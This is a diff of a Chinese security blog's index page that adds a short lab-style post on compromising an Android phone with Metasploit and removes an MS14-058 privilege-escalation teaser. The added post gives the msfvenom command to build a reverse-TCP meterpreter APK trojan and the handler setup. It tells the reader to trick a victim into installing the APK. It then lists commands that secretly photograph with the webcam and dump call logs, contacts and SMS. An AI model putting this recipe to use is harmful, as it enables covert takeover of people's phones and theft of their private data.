@@ -393,6 +393,161 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/18/利用msf渗透Android手机/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sher10ck">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sriracha :)">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/11/18/利用msf渗透Android手机/" class="post-title-link" itemprop="url">利用msf渗透Android手机</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-11-18 13:48:18 / 修改时间：14:18:20" itemprop="dateCreated datePublished" datetime="2019-11-18T13:48:18+08:00">2019-11-18</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <a id="more"></a>
+<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>Kali:172.16.28.153<br>Android:172.16.28.158</p>
+<p>首先用Msfvenom生成一个apk木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=172.16.105.184 LPORT=4444 R &gt; /root/apk.apk</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/11/18/利用msf渗透Android手机/apk.png" alt></p>
+<p>然后msfconsole设置监听(默认监听端口4444)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload android/meterpreter/reverse_tcp</span><br><span class="line">set lhost 172.16.28.153</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
+<p>然后想办法让受害者点击这个木马apk<br><img src="/2019/11/18/利用msf渗透Android手机/meterpreter.png" alt></p>
+<p>我们会拿到一个meterpreter，这里可以输入 help/? 来查看我们能够输入的命令<br><img src="/2019/11/18/利用msf渗透Android手机/core.png" alt></p>
+<p>我们来测试几条经常使用的命令：<br>check_root //检测是否为root权限<br><img src="/2019/11/18/利用msf渗透Android手机/root.png" alt></p>
+<p>webcam_snap    //通过摄像头拍照<br><img src="/2019/11/18/利用msf渗透Android手机/snap.png" alt></p>
+<p>dump_calllog    //导出通话记录<br><img src="/2019/11/18/利用msf渗透Android手机/calllog.png" alt><br><img src="/2019/11/18/利用msf渗透Android手机/call.png" alt></p>
+<p>dump_contacts    //导出通讯录<br><img src="/2019/11/18/利用msf渗透Android手机/concat.png" alt><br><img src="/2019/11/18/利用msf渗透Android手机/contact.png" alt></p>
+<p>dump_sms    //导出短信内容<br><img src="/2019/11/18/利用msf渗透Android手机/sms.png" alt><br><img src="/2019/11/18/利用msf渗透Android手机/sms2.png" alt></p>
+<p>app_list    //列出安装的app<br><img src="/2019/11/18/利用msf渗透Android手机/app.png" alt></p>
+<p>还可以实时开启监控</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1759,154 +1914,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/18/MS14-058提权/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="sher10ck">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sriracha :)">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/10/18/MS14-058提权/" class="post-title-link" itemprop="url">MS14-058提权</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-10-18 13:04:10 / 修改时间：13:35:04" itemprop="dateCreated datePublished" datetime="2019-10-18T13:04:10+08:00">2019-10-18</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>其实是本来想找一个提权windows 2008 R2的，在msf上尝试了很多无果<br></p>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2019/10/18/MS14-058提权/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1954,7 +1961,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">49</span>
+                    <span class="site-state-item-count">50</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
